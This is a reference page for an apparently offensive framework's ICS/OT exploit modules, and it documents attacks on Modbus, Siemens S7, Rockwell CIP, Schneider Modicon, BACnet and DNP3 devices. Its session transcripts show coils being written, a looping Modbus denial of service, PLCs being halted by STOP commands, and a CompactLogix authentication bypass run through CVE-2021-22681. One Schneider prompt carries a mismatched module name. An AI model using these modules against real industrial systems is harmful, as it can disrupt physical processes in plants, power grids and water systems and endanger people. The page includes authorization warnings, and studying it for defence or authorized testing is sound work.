# ICS / OT Modules Reference

**Language:** English (en-US) | **pt-BR:** [../pt-BR/20-modulos-ics-ot.md](../pt-BR/20-modulos-ics-ot.md)

---

## Overview

EmbedXPL-Forge includes a dedicated ICS/OT module set under `embedxpl/modules/exploits/ics/` and `embedxpl/modules/scanners/ics/`. These modules target industrial control systems over their native protocols: Modbus/TCP, S7comm+, EtherNet/IP (CIP), BACnet/IP, DNP3, and PROFINET.

**Important:** All modules require explicit authorization before use in any production OT environment. Industrial protocols have no authentication by design — commands take effect immediately and may disrupt physical processes.

---

## Modbus/TCP Modules (`exploits/ics/modbus/`)

Modbus/TCP operates on TCP port 502. No authentication. All function codes execute without credential challenge on default configurations.

### Module list

| Module | Function Code | MITRE ICS | Description |
|--------|--------------|-----------|-------------|
| `read_coil_status` | FC1 | T0801 | Read discrete coil (output) states |
| `read_discrete_inputs` | FC2 | T0801 | Read discrete input (sensor) states |
| `read_holding_registers` | FC3 | T0801 | Read holding registers (set points, PID params) |
| `read_input_registers` | FC4 | T0801 | Read input registers (live process measurements) |
| `write_single_coil` | FC5 | T0855 | Write a single coil (turn output on/off) |
| `write_single_register` | FC6 | T0855 | Write a single holding register |
| `dos_write_coils` | FC5 (loop) | T0814 | DoS by writing all coils to 0 in a loop |
| `dos_write_registers` | FC6/FC16 (loop) | T0814 | DoS by writing registers to 0 in a loop |
| `buspwn_modbus_scanner_dos` | FC3+FC5 | T0814 | Multi-slave scanner + DoS chain |
| `modbus_ot_attack_scenarios` | Multi | T0855, T0814 | Chained attack scenario (recon + control + DoS) |

### Common options (all Modbus modules)

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `target` | `OptIP` | `""` | Target Modbus slave IP |
| `port` | `OptPort` | `502` | Target port (Modbus/TCP default: 502) |
| `unit_id` | `OptInt` | `1` | Modbus Unit ID (slave address, 1-247) |
| `address` | `OptInt` | `0` | Starting register/coil address (0-65535) |
| `quantity` | `OptInt` | `10` | Number of registers/coils to read |
| `timeout` | `OptInt` | `5` | TCP connection timeout in seconds |

Write modules also have:

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `value` | `OptInt` | `0` | Value to write (coil: `0` or `65280`, register: `0-65535`) |

---

### `read_holding_registers` — I/O session

```
exf> use exploits/ics/modbus/read_holding_registers
exf (modbus/read_holding_registers) > show options

Target options:
Name       Current settings  Description
---------- ----------------  -------------------------------------
target                       Target IP (Modbus slave)
port       502               Modbus/TCP port

Module options:
Name       Current settings  Description
---------- ----------------  -------------------------------------
unit_id    1                 Modbus Unit ID (slave address)
address    0                 Starting register address
quantity   10                Number of registers to read
timeout    5                 Connection timeout (seconds)

exf (modbus/read_holding_registers) > set target 192.168.100.10
[+] target => 192.168.100.10
exf (modbus/read_holding_registers) > set address 0
[+] address => 0
exf (modbus/read_holding_registers) > set quantity 20
[+] quantity => 20
exf (modbus/read_holding_registers) > run

[*] Running module embedxpl.modules.exploits.ics.modbus.read_holding_registers...
[*] Connecting to 192.168.100.10:502 (Unit ID: 1)
[*] Sending FC3 Read Holding Registers: addr=0, qty=20

[+] Holding Registers (Unit 1):
   Addr | Raw (hex) | Decimal | Interpretation
   ---- | --------- | ------- | --------------
   0000 | 0x0064    |     100 | Temperature set point (°C * 10 = 10.0°C)
   0001 | 0x00F0    |     240 | Pressure limit (kPa * 10 = 24.0 kPa)
   0002 | 0x03E8    |    1000 | Motor speed set point (RPM)
   0003 | 0x0019    |      25 | PID proportional gain (P * 10 = 2.5)
   0004 | 0x000A    |      10 | PID integral time (seconds)
   0005 | 0x0005    |       5 | PID derivative time (seconds)
   0006 | 0x0001    |       1 | Control mode (1=Auto, 0=Manual)
   0007 | 0x0000    |       0 | Alarm status (0=OK)
   0008 | 0x012C    |     300 | High temperature alarm limit (°C * 10)
   0009 | 0x0000    |       0 | Low temperature alarm limit
   000A | 0x0BB8    |    3000 | Max motor speed (RPM)
   000B | 0x0001    |       1 | Pump 1 enable
   000C | 0x0000    |       0 | Pump 2 enable
   000D | 0x01F4    |     500 | Flow rate set point (L/min * 10)
   000E | 0x0000    |       0 | Valve position (0=closed, 65280=open)
   000F | 0x03E8    |    1000 | Tank level set point (mm)
   0010 | 0x0000    |       0 | Emergency stop status
   0011 | 0x0000    |       0 | Maintenance mode
   0012 | 0x0001    |       1 | Safety relay output
   0013 | 0x0002    |       2 | Communication watchdog timeout (s)
```

---

### `write_single_coil` — I/O session

```
exf> use exploits/ics/modbus/write_single_coil
exf (modbus/write_single_coil) > set target 192.168.100.10
[+] target => 192.168.100.10
exf (modbus/write_single_coil) > set address 3
[+] address => 3
exf (modbus/write_single_coil) > set value 65280
[+] value => 65280
exf (modbus/write_single_coil) > run

[*] Running module...
[*] Sending FC5 Write Single Coil: addr=3, value=ON (0xFF00)
[+] Coil 3 written successfully (ON)
[WARN] Physical output state changed — verify process safety
```

---

### `dos_write_coils` — I/O session

```
exf> use exploits/ics/modbus/dos_write_coils
exf (modbus/dos_write_coils) > set target 192.168.100.10
[+] target => 192.168.100.10
exf (modbus/dos_write_coils) > run

[*] DoS attack: writing all coils to OFF (0x0000) in loop
[*] Iteration 1: wrote 64 coils starting at address 0...
[*] Iteration 2: wrote 64 coils starting at address 64...
[*] Iteration 3: wrote 64 coils starting at address 128...
[WARN] Sending FC5 to all coil addresses — this will disrupt physical process outputs
[*] Press Ctrl+C to stop

^C
[*] DoS stopped after 3 iterations
```

---

## Siemens S7comm+ Modules (`exploits/ics/siemens/`)

S7comm+ operates over TPKT/COTP on TCP port 102. No authentication required on default S7-1200 and S7-300/400 configurations.

### Module list

| Module | Target | MITRE ICS | Description |
|--------|--------|-----------|-------------|
| `s7_1200_plc_control` | S7-1200 | T0855 | Stop/Start/Reset S7-1200 via S7comm+ |
| `s7_300_400_plc_control` | S7-300/400 | T0855 | Stop/Start/Reset S7-300/400 via S7comm |
| `profinet_set_ip` | PROFINET devices | T0855 | Set/change IP address via DCP/PROFINET |
| `siprotec_relay_dos_cve_2015_5374` | Siemens SIPROTEC | CVE-2015-5374 | DoS via malformed EN100 packet |

### `s7_1200_plc_control` — options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `target` | `OptIP` | `""` | PLC IP address |
| `port` | `OptPort` | `102` | S7comm+ port (ISO-on-TCP default: 102) |
| `action` | `OptString` | `stop` | Action: `stop`, `start`, `reset`, `reset_ip` |
| `timeout` | `OptInt` | `5` | Connection timeout |

### `s7_1200_plc_control` — I/O session (STOP)

```
exf> use exploits/ics/siemens/s7_1200_plc_control
exf (siemens/s7_1200_plc_control) > set target 192.168.100.20
[+] target => 192.168.100.20
exf (siemens/s7_1200_plc_control) > set action stop
[+] action => stop
exf (siemens/s7_1200_plc_control) > check

[*] Checking S7-1200 at 192.168.100.20:102...
[*] Sending TPKT/COTP connection request...
[*] Sending S7comm+ session establishment...
[+] Target is vulnerable — S7-1200 accepts unauthenticated S7comm+ commands

exf (siemens/s7_1200_plc_control) > run

[*] Running module embedxpl.modules.exploits.ics.siemens.s7_1200_plc_control...
[*] Establishing TPKT/COTP connection to 192.168.100.20:102...
[*] Session established (S7comm+ session ID: 0x01)
[*] Sending PLC STOP command...
[+] STOP command acknowledged — PLC CPU halted
[WARN] Industrial process halted. Restore with: set action start; run
```

### `s7_1200_plc_control` — I/O session (START after STOP)

```
exf (siemens/s7_1200_plc_control) > set action start
[+] action => start
exf (siemens/s7_1200_plc_control) > run

[*] Sending PLC START command...
[+] START command acknowledged — PLC CPU running
```

---

## Rockwell / Allen-Bradley CIP Modules (`exploits/ics/rockwell/`)

EtherNet/IP / CIP operates on TCP/UDP port 44818. Used by Allen-Bradley CompactLogix, ControlLogix, and MicroLogix PLCs.

### Module list

| Module | CVE | MITRE ICS | Description |
|--------|-----|-----------|-------------|
| `compactlogix_auth_bypass_cve_2021_22681` | CVE-2021-22681 | T0855, T0862 | Authentication bypass in CompactLogix 5370/5380 |
| `compactlogix_code_injection_cve_2022_1161` | CVE-2022-1161 | T0843 | Code injection in CompactLogix L3x series |
| `compactlogix_cip_dos_cve_2024_6077` | CVE-2024-6077 | T0814 | DoS via malformed CIP message (crash, reboot) |

### `compactlogix_auth_bypass_cve_2021_22681` — options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `target` | `OptIP` | `""` | CompactLogix PLC IP |
| `port` | `OptPort` | `44818` | EtherNet/IP CIP port |
| `slot` | `OptInt` | `0` | Backplane slot of the controller |
| `timeout` | `OptInt` | `5` | Connection timeout |

### `compactlogix_auth_bypass_cve_2021_22681` — I/O session

```
exf> use exploits/ics/rockwell/compactlogix_auth_bypass_cve_2021_22681
exf (rockwell/compactlogix_auth_bypass_cve_2021_22681) > set target 192.168.100.30
[+] target => 192.168.100.30
exf (rockwell/compactlogix_auth_bypass_cve_2021_22681) > check

[*] Checking CompactLogix at 192.168.100.30:44818...
[*] Sending EtherNet/IP Register Session request...
[*] Sending CIP Forward_Open with target slot 0...
[+] Target is vulnerable — authentication bypass confirmed (CVE-2021-22681)

exf (rockwell/compactlogix_auth_bypass_cve_2021_22681) > run

[*] Connecting to 192.168.100.30:44818 (EtherNet/IP)...
[*] Session registered (Session Handle: 0x00000001)
[+] Authentication bypassed via CVE-2021-22681
[+] PLC identity:
    Vendor       : Rockwell Automation / Allen-Bradley
    Product Type : Programmable Logic Controller
    Product Code : 89 (CompactLogix 5370 L3)
    Revision     : 32.11
    Serial       : A4B5C6D7
    Product Name : 1769-L30ER/A CompactLogix5370 L30ER Controller
[*] Access level: PROGRAM (read + write program + remote start/stop)
```

---

## Schneider Electric Modicon Modules (`exploits/ics/schneider/`)

| Module | CVE | MITRE ICS | Description |
|--------|-----|-----------|-------------|
| `modicon_modbus_control_cve_2018_7841` | CVE-2018-7841 | T0855 | Unauthenticated Modicon M340/M580 control via Modbus |
| `net55xx_encoder_rce_cve_2018_7784` | CVE-2018-7784 | T0855 | RCE on NET55XX encoder via Modbus write |
| `quantum_plc_control` | N/A | T0855 | Modicon Quantum PLC Stop/Start via FTP + Modbus |

### `modicon_modbus_control_cve_2018_7841` — I/O session

```
exf> use exploits/ics/schneider/modicon_modbus_control_cve_2018_7841
exf (schneider/modicon_modbus_control_cve_2018_7841) > set target 192.168.100.40
[+] target => 192.168.100.40
exf (schneider/modicon_modbus_control_cve_2018_7841) > set action stop
[+] action => stop
exf (schneider/modicon_modbus_control_cve_2021_22681) > run

[*] Sending Modbus FC90 (Modicon extension) STOP command to 192.168.100.40...
[+] Modicon M340 STOP acknowledged (CVE-2018-7841)
[WARN] PLC halted — industrial process disrupted
```

---

## BACnet/IP Modules (`exploits/bms/`)

BACnet/IP operates on UDP port 47808. Common in building automation systems (HVAC, lighting, access control).

### Module list

| Module | MITRE ICS | Description |
|--------|-----------|-------------|
| `bacnet_discover` | T0846 | BACnet Who-Is broadcast — enumerate all devices |
| `bacnet_read_property` | T0801 | Read any BACnet object property |
| `bacnet_write_property` | T0855 | Write BACnet property (e.g. set HVAC set point) |
| `bacnet_who_has` | T0846 | Enumerate BACnet objects by name |

### `bacnet_read_property` — options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `target` | `OptIP` | `""` | BACnet device IP |
| `port` | `OptPort` | `47808` | BACnet/IP port (UDP) |
| `device_id` | `OptInt` | `1` | BACnet Device Object Identifier |
| `object_type` | `OptInt` | `0` | BACnet object type (0=Analog Input, 1=Analog Output, 2=Analog Value...) |
| `object_instance` | `OptInt` | `1` | Object instance number |
| `property_id` | `OptInt` | `85` | Property identifier (85=Present_Value, 77=Object_Name) |

### `bacnet_read_property` — I/O session

```
exf> use exploits/bms/bacnet_read_property
exf (bms/bacnet_read_property) > set target 10.0.1.50
[+] target => 10.0.1.50
exf (bms/bacnet_read_property) > set object_type 0
[+] object_type => 0
exf (bms/bacnet_read_property) > set object_instance 1
[+] object_instance => 1
exf (bms/bacnet_read_property) > run

[*] Connecting to 10.0.1.50:47808 (UDP BACnet/IP)...
[*] Sending Read-Property request: AI:1 Present_Value...
[+] Response:
    Device ID : 1234
    Object    : Analog Input 1 (Room Temperature Sensor)
    Property  : Present_Value
    Value     : 22.3 (°C)
    Units     : degrees-Celsius (62)
```

---

## DNP3 Modules (`exploits/ics/generic/` and `scanners/ics/`)

DNP3 operates over TCP port 20000 or serial. Common in power grid (SCADA/RTU) and water systems.

### Module list

| Module | MITRE ICS | Description |
|--------|-----------|-------------|
| `dnp3_scan` | T0846 | DNP3 master emulator — enumerate devices and data points |
| `dnp3_read_class0` | T0801 | DNP3 Read Class 0 (all static data) |
| `dnp3_unsolicited_disable` | T0836 | Disable unsolicited responses (communication disruption) |

### `dnp3_scan` — I/O session

```
exf> use scanners/ics/dnp3_scan
exf (ics/dnp3_scan) > set target 192.168.100.100
[+] target => 192.168.100.100
exf (ics/dnp3_scan) > run

[*] DNP3 scan: 192.168.100.100:20000
[*] Sending DNP3 Data Link Layer Request (broadcast addr 0xFFFF)...
[+] Device at address 3 responded:
    Device Name : Substation RTU-3
    Vendor      : SEL
    DNP3 Addr   : 3
    Data points : 48 Binary Inputs, 12 Binary Outputs, 16 Analog Inputs
[+] Device at address 7 responded:
    Device Name : Feeder RTU-7
    Vendor      : GE
    DNP3 Addr   : 7
    Data points : 32 Binary Inputs, 8 Binary Outputs, 8 Analog Inputs
```

---

## General ICS safety considerations

| Protocol | Default port | Auth | Disruption risk |
|----------|-------------|------|-----------------|
| Modbus/TCP | TCP 502 | None | High — direct coil/register write = process disruption |
| S7comm+ | TCP 102 | None on default config | Critical — STOP = PLC halts |
| EtherNet/IP / CIP | TCP/UDP 44818 | Optional | High — depends on controller state |
| BACnet/IP | UDP 47808 | None on default | Medium — building automation (HVAC, lighting) |
| DNP3 | TCP 20000 | Optional (SAv5) | High — power grid / water systems |
| PROFINET | UDP 34964 | None on default | High — device IP change = communication loss |

Always use `check` before `run` for ICS modules. For modules that write to physical outputs, `check` verifies reachability and protocol response — it does **not** write to the process. Only `run` sends write commands.
